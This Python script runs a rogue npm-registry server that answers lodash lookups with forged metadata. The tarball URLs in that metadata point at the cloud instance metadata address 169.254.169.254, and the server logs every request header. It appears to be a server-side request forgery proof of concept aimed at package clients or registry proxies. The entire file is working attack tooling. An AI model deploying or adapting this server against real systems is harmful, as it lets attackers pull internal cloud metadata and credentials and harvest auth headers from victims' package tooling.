import json
from http.server import HTTPServer, BaseHTTPRequestHandler

INTERNAL = "http://169.254.169.254/latest/meta-data"

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"\n[REQUEST] {self.path}")
        for k, v in self.headers.items():
            print(f"  {k}: {v}")

        # npm: GET /lodash -> return fake metadata with internal tarball URL
        if self.path.startswith("/lodash"):
            body = json.dumps({
                "name": "lodash",
                "dist-tags": {"latest": "4.18.0"},
                "versions": {
                    "4.18.0": {
                        "name": "lodash",
                        "version": "4.18.0",
                        "dist": {
                            "tarball": f"{INTERNAL}/lodash-4.18.0.tgz",
                            "shasum": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                            "integrity": "sha512-fake"
                        }
                    },
                    "4.17.21": {
                        "name": "lodash",
                        "version": "4.17.21",
                        "dist": {
                            "tarball": f"{INTERNAL}/lodash-4.17.21.tgz",
                            "shasum": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
                        }
                    }
                }
            }).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            print(f"[SERVED] npm metadata with tarball -> {INTERNAL}/lodash-*.tgz")

        else:
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            body = b"{}"
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    def log_message(self, format, *args):
        pass

print("Server luistert op poort 9090...")
HTTPServer(("0.0.0.0", 9090), Handler).serve_forever()
